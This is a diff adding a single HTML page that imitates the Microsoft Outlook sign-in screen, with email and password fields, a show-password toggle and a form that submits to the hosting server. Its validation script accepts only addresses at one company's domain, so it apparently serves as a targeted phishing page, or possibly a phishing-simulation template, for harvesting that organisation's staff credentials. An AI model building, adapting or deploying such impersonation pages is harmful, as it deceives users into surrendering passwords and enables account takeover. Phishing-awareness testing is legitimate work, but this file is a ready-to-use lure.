@@ -1,0 +1,221 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<title>Outlook Sign In</title>
+	<style type="text/css">body {
+            font-family: "Segoe UI", Arial, sans-serif;
+            margin: 0;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #ffecec 0%, #f0fff0 100%);
+        }
+
+        .page-title {
+            color: #333;
+            font-size: 46px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .microsoft-header {
+            color: #666;
+            font-size: 19px;
+            margin-bottom: 13px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+
+        .login-form {
+            width: 100%;
+            max-width: 440px;
+            background: white;
+            padding: 48px;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        table {
+            width: 100%;
+        }
+
+        td {
+            padding: 8px 0;
+        }
+
+        .input-label {
+            font-size: 14px;
+            margin-bottom: -3px;
+            display: block;
+        }
+
+        .required {
+            color: #e81123;
+        }
+
+        .password-container {
+            position: relative;
+            margin-top: -3px;
+        }
+
+        input[type="email"],
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 3px 12px;
+            font-size: 14px;
+            border: 1px solid #666;
+            border-radius: 2px;
+            box-sizing: border-box;
+            height: 38px;
+            margin-top: 8px;
+        }
+
+        /* Remove default password toggle */
+        input[type="password"]::-ms-reveal,
+        input[type="password"]::-ms-clear {
+            display: none;
+        }
+
+        .show-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-20%);
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 13px;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 0;
+        }
+
+        .show-password:hover {
+            text-decoration: underline;
+        }
+
+        .checkbox-row {
+            margin: 32px 0;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+      		margin-TOP: -7px;
+      		margin-bottom: -10px;
+            gap: 12px;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+      		margin: 0;
+            accent-color: #008575;
+        }
+
+        .signin-button {
+            width: 100%;
+            background-color: #000;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 14px;
+            cursor: pointer;
+            margin: 24px 0;
+        }
+
+        .signin-button:hover {
+            background-color: #222;
+      
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 32px;
+        }
+
+        .forgot-password a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            color: #e81123;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+	</style>
+</head>
+<body>
+<div class="page-title">Outlook</div>
+
+<div class="login-form">
+<div class="microsoft-header">Microsoft</div>
+
+<h1>Sign in</h1>
+
+<form action="" method="POST" onsubmit="return validateForm()">
+<table cellpadding="0" cellspacing="0">
+	<tbody>
+		<tr>
+			<td><label class="input-label">Email <span class="required">*</span> </label> <input id="email" name="email" placeholder="Email, phone, or Skype" required="" type="email"/>
+			<div class="error-message" id="emailError">Please enter the correct email id and password</div>
+			</td>
+		</tr>
+		<tr>
+			<td><label class="input-label">Password <span class="required">*</span> </label>
+			<div class="password-container"><input id="password" name="password" required="" type="password"/><button class="show-password" onclick="togglePassword(this)" type="button">Show</button></div>
+			</td>
+		</tr>
+		<tr>
+			<td class="checkbox-row"><label class="checkbox-container"><input name="keep_signed_in" type="checkbox"/> Keep me signed in on this device </label></td>
+		</tr>
+		<tr>
+			<td><button class="signin-button" type="submit">Sign In</button></td>
+		</tr>
+		<tr>
+			<td class="forgot-password">Need to find <a href="#">your password</a>?</td>
+		</tr>
+	</tbody>
+</table>
+</form>
+</div>
+<script>
+        function togglePassword(button) {
+            const passwordInput = button.previousElementSibling;
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                button.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                button.textContent = 'Show';
+            }
+        }
+
+        function validateForm() {
+            const email = document.getElementById('email').value;
+            const emailError = document.getElementById('emailError');
+            const emailRegex = /^[a-zA-Z]+\.[a-zA-Z]+@katalystpartners\.com$/;
+
+            if (!emailRegex.test(email)) {
+                emailError.style.display = 'block';
+                return false;
+            } else {
+                emailError.style.display = 'none';
+                return true;
+            }
+        }
+    </script>
+
+</body></html>
